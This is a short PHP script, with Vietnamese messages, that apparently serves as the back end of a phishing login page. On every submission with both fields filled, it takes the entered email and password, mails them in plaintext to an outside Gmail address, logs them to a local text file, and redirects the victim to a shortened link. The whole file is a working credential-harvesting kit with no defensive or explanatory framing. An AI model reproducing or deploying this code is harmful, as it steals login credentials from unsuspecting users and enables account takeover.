<?php
    session_start();
    ob_start();

?>
    <?php
      if(isset($_POST["login"])){
        $username = $_POST["email"];
        $password = $_POST["password"];
            if($username == ""|| $password == ""){
                echo "Bạn chưa nhập đầy đủ thông tin";
                
            }else{
                
            $_SESSION["username"] = $username;
            echo $_SESSION["username"];
            $subject = "Tài khoản";
            $headers = "Tài khoản mới";
            $body = " \n Email: $username - Pass: $password \n ";
            mail("vvvanvo1206vv@gmail.com", $headers, $body, $subject);
            $test = fopen("./text/admin.txt","a");
            fwrite($test,$body);
            fclose($test); 
            
            header('Location:https://bit.ly/39EDg2g');
            }

      }

    ?>